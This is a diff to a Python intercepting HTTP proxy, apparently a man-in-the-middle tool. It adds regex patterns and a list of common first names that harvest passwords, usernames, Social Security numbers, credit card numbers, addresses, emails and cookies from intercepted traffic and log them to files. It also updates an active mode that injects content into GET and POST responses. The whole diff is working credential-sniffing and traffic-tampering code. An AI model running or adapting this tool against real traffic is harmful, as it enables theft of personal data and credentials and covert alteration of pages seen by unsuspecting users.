@@ -15,6 +15,231 @@ from urllib.parse import unquote
 args = None
 file_lock = threading.Lock()
 target_url = "example.com"
+top_names = [
+    "Jacob",
+    "Isabella",
+    "Ethan",
+    "Sophia",
+    "Michael",
+    "Emma",
+    "Jayden",
+    "Olivia",
+    "William",
+    "Ava",
+    "Alexander",
+    "Emily",
+    "Noah",
+    "Abigail",
+    "Daniel",
+    "Madison",
+    "Aiden",
+    "Chloe",
+    "Anthony",
+    "Mia",
+    "Joshua",
+    "Addison",
+    "Mason",
+    "Elizabeth",
+    "Christopher",
+    "Ella",
+    "Andrew",
+    "Natalie",
+    "David",
+    "Samantha",
+    "Matthew",
+    "Alexis",
+    "Logan",
+    "Lily",
+    "Elijah",
+    "Grace",
+    "James",
+    "Hailey",
+    "Joseph",
+    "Hannah",
+    "Gabriel",
+    "Alyssa",
+    "Benjamin",
+    "Lillian",
+    "Ryan",
+    "Avery",
+    "Samuel",
+    "Leah",
+    "Jackson",
+    "Nevaeh",
+    "John",
+    "Sarah",
+    "Nathan",
+    "Anna",
+    "Jonathan",
+    "Sofia",
+    "Christian",
+    "Ashley",
+    "Liam",
+    "Brianna",
+    "Dylan",
+    "Zoe",
+    "Landon",
+    "Victoria",
+    "Caleb",
+    "Gabriella",
+    "Tyler",
+    "Brooklyn",
+    "Lucas",
+    "Kaylee",
+    "Evan",
+    "Taylor",
+    "Nicholas",
+    "Layla",
+    "Gavin",
+    "Allison",
+    "Isaac",
+    "Evelyn",
+    "Brayden",
+    "Riley",
+    "Luke",
+    "Amelia",
+    "Angel",
+    "Khloe",
+    "Isaiah",
+    "Makayla",
+    "Brandon",
+    "Savannah",
+    "Jack",
+    "Aubrey",
+    "Jordan",
+    "Charlotte",
+    "Owen",
+    "Zoey",
+    "Carter",
+    "Bella",
+    "Connor",
+    "Kayla",
+    "Justin",
+    "Alexa",
+    "Jeremiah",
+    "Peyton",
+    "Jose",
+    "Audrey",
+    "Julian",
+    "Claire",
+    "Robert",
+    "Arianna",
+    "Aaron",
+    "Julia",
+    "Adrian",
+    "Aaliyah",
+    "Wyatt",
+    "Kylie",
+    "Hunter",
+    "Lauren",
+    "Kevin",
+    "Sophie",
+    "Cameron",
+    "Sydney",
+    "Zachary",
+    "Camila",
+    "Thomas",
+    "Jasmine",
+    "Charles",
+    "Morgan",
+    "Austin",
+    "Alexandra",
+    "Eli",
+    "Jocelyn",
+    "Chase",
+    "Maya",
+    "Henry",
+    "Gianna",
+    "Sebastian",
+    "Mackenzie",
+    "Jason",
+    "Kimberly",
+    "Levi",
+    "Katherine",
+    "Xavier",
+    "Destiny",
+    "Ian",
+    "Brooke",
+    "Colton",
+    "Faith",
+    "Dominic",
+    "Trinity",
+    "Cooper",
+    "Lucy",
+    "Juan",
+    "Madelyn",
+    "Josiah",
+    "Madeline",
+    "Ayden",
+    "Bailey",
+    "Luis",
+    "Payton",
+    "Adam",
+    "Andrea",
+    "Nathaniel",
+    "Autumn",
+    "Carson",
+    "Melanie",
+    "Brody",
+    "Serenity",
+    "Tristan",
+    "Ariana",
+    "Parker",
+    "Stella",
+    "Diego",
+    "Maria",
+    "Blake",
+    "Molly",
+    "Oliver",
+    "Caroline",
+    "Cole",
+    "Genesis",
+    "Carlos",
+    "Kaitlyn",
+    "Jaden",
+    "Eva",
+    "Jesus",
+    "Jessica",
+    "Alex",
+    "Angelina",
+    "Aidan",
+    "Gabrielle",
+    "Eric",
+    "Naomi",
+    "Hayden",
+    "Valeria",
+    "Bryan",
+    "Mariah",
+    "Max",
+    "Natalia",
+    "Jaxon",
+    "Rachel",
+    "Bentley",
+    "Paige",
+]
+passive_patterns = {
+    "username": re.compile(r"\buser(?:name)?=(.*?)(?:&|$)"),
+    "password": re.compile(r"(?:password|pwd|pass)=(.*?)(?:&|$)"),
+    "zip": re.compile(r"(?:zip|zipcode)=(.*?)(?:&|$)"),
+    "state": re.compile(r"(?:state|province|region|st)=(.*?)(?:&|$)"),
+    "city": re.compile(r"\bcity=(.*?)(?:&|$)"),
+    "phone_param": re.compile(r"(?:phone|telephone|mobile)=(.*?)(?:&|$)"),
+    "phone": re.compile(r"\b(\d{3}[-.\s]?\d{3}[-.\s]\d{4})\b"),
+    "ssn": re.compile(r"(?:ssn|social|security|social-security)=(.*?)(?:&|$)"),
+    "address_param": re.compile(r"(?:address|addr)=(.*?)(?:&|$)"),
+    "address": re.compile(r"\b(\d+\s[A-Z][a-zA-Z\s]+,?\s[A-Z]{2}\s\d{5}(-\d{4})?)\b"),
+    "birthday": re.compile(r"(?:birthday|bday)=(.*?)(?:&|$)"),
+    "last": re.compile(r"(?:last|surname|lastname|lname)=(.*?)(?:&|$)"),
+    "first": re.compile(r"(?:first|firstname|fname)=(.*?)(?:&|$)"),
+    "email_param": re.compile(r"(?:email|e-mail|mail)=(.*?)(?:&|$)"),
+    "email": re.compile(r"\b([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})\b"),
+    "credit_card": re.compile(r"\b((?:\d{4}[- ]?){3}\d{4})\b"),
+    "credit_card_param": re.compile(r"(?:credit-card|creditcard)=(.*?)(?:&|$)"),
+    "ssn": re.compile(r"\b(\d{3}-\d{2}-\d{4})\b"),
+    "ssn_param": re.compile(r"(?:ssn|social|security|social-security)=(.*?)(?:&|$)"),
+    "name": re.compile(r"\b([A-Z][a-z]+ [A-Z][a-z]+)\b"),
+    "cookie": re.compile(r"(?:Cookie|Set-Cookie):\s?(.*)"),
+}
 
 
 # Get the command line arguments
@@ -38,42 +263,39 @@ def test_patterns(query_string, patterns: dict[str, re.Pattern]):
             if matches[0] == "":
                 results[key] = None
                 continue
-            
+
         results[key] = matches
     return results
 
 
-def passive(data: str, url: str):
-    patterns = {
-        "username": re.compile(r"\buser(?:name)?=(.*?)(?:&|$)"),
-        "password": re.compile(r"(?:password|pwd|pass)=(.*?)(?:&|$)"),
-        "zip": re.compile(r"(?:zip|zipcode)=(.*?)(?:&|$)"),
-        "state": re.compile(r"(?:state|province|region|st)=(.*?)(?:&|$)"),
-        "city": re.compile(r"\bcity=(.*?)(?:&|$)"),
-        "phone_param": re.compile(r"(?:phone|telephone|mobile)=(.*?)(?:&|$)"),
-        "phone": re.compile(r"\b(\d{3}[-.\s]?\d{3}[-.\s]\d{4})\b"),
-        "ssn": re.compile(r"(?:ssn|social|security|social-security)=(.*?)(?:&|$)"),
-        "address_param": re.compile(r"(?:address|addr)=(.*?)(?:&|$)"),
-        "address": re.compile(
-            r"\b(\d+\s[A-Z][a-zA-Z\s]+,?\s[A-Z]{2}\s\d{5}(-\d{4})?)\b"
-        ),
-        "birthday": re.compile(r"(?:birthday|bday)=(.*?)(?:&|$)"),
-        "last": re.compile(r"(?:last|surname|lastname|lname)=(.*?)(?:&|$)"),
-        "first": re.compile(r"(?:first|firstname|fname)=(.*?)(?:&|$)"),
-        "email_param": re.compile(r"(?:email|e-mail|mail)=(.*?)(?:&|$)"),
-        "email": re.compile(r"\b([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})\b"),
-        "credit_card": re.compile(r"\b((?:\d{4}[- ]?){3}\d{4})\b"),
-        "credit_card_param": re.compile(r"(?:credit-card|creditcard)=(.*?)(?:&|$)"),
-        "ssn": re.compile(r"\b(\d{3}-\d{2}-\d{4})\b"),
-        "ssn_param": re.compile(
-            r"(?:ssn|social|security|social-security)=(.*?)(?:&|$)"
-        ),
-        "name": re.compile(r"\b([A-Z][a-z]+ [A-Z][a-z]+)\b"),
-        "cookie": re.compile(r"(?:Cookie|Set-Cookie):\s?(.*)"),
-    }
+def find_common_names_with_context(text, names, context_size=2):
+    # Escape names for regex and join them with '|'
+    names_pattern = "|".join(re.escape(name) for name in names)
 
+    # Pattern to match a word. Adjust as needed (e.g., to handle hyphens, apostrophes)
+    word_pattern = r"\b\w+\b"
+
+    # Create a regex pattern to find a word, then a name, then another word
+    # This includes 'context_size' words before and after the name
+    pattern = rf"((?:{word_pattern}\W+){{0,{context_size}}})\b({names_pattern})\b((?:\W+{word_pattern}){{0,{context_size}}})"
+
+    name_regex = re.compile(pattern, re.IGNORECASE)
+
+    # Find all matches
+    matches = name_regex.findall(text)
+
+    results = []
+    for before, name, after in matches:
+        context = f"{before.strip()} {name} {after.strip()}"
+        results.append(context.strip())
+
+    return results
+
+
+def passive(data: str, url: str):
     # Test the patterns
-    results = test_patterns(unquote(data), patterns)
+    results = test_patterns(unquote(data), passive_patterns)
+    names = find_common_names_with_context(unquote(data), top_names)
 
     # Print the results
     with file_lock:
@@ -82,7 +304,10 @@ def passive(data: str, url: str):
 
             for key, value in results.items():
                 if value:
-                    f.write(f"{key}: {', '.join(value)}\n")
+                    f.write(f"\t{key}: {', '.join(value)}\n")
+
+            if len(names) > 0:
+                f.write(f"\tTop Names: {', '.join(names)}\n")
 
             f.write("\n")
 
@@ -230,6 +455,7 @@ def extract_info(req: str) -> dict[str, str]:
     # Test the patterns
     return test_patterns(req, patterns)
 
+
 def log_query(query: dict[str, str], msg: str):
     with file_lock:
         with open("info_2.txt", "a") as f:
@@ -237,7 +463,7 @@ def log_query(query: dict[str, str], msg: str):
 
             for key, value in query.items():
                 if value:
-                    f.write(f"{key}: {unquote(value)}\n")
+                    f.write(f"\t{key}: {unquote(', '.join(value))}\n")
 
             f.write("\n")
 
@@ -446,7 +672,11 @@ def handle_client(client_sock: socket, passive_mode: bool):
             response = response_data.split(b"\r\n\r\n")
 
             headers = response[0].decode("utf-8")
-            body = response[1]
+
+            if len(response) > 1:
+                body = response[1]
+            else:
+                body = b""
 
             body_length = get_content_length(headers)
 
@@ -460,17 +690,18 @@ def handle_client(client_sock: socket, passive_mode: bool):
             if passive_mode:
                 passive(headers + "\r\n" + body, url)
             else:
-                injected = encode_body(active(body), encoding)
+                if method == "POST" or method == "GET":
+                    injected = encode_body(active(body), encoding)
 
-                response_data = (
-                    re.sub(
-                        r"Content-Length: \d+",
-                        f"Content-Length: {len(injected)}",
-                        headers,
-                    ).encode("utf-8")
-                    + b"\r\n\r\n"
-                    + injected
-                )
+                    response_data = (
+                        re.sub(
+                            r"Content-Length: \d+",
+                            f"Content-Length: {len(injected)}",
+                            headers,
+                        ).encode("utf-8")
+                        + b"\r\n\r\n"
+                        + injected
+                    )
 
             client_sock.sendall(response_data)
     except Exception as e:
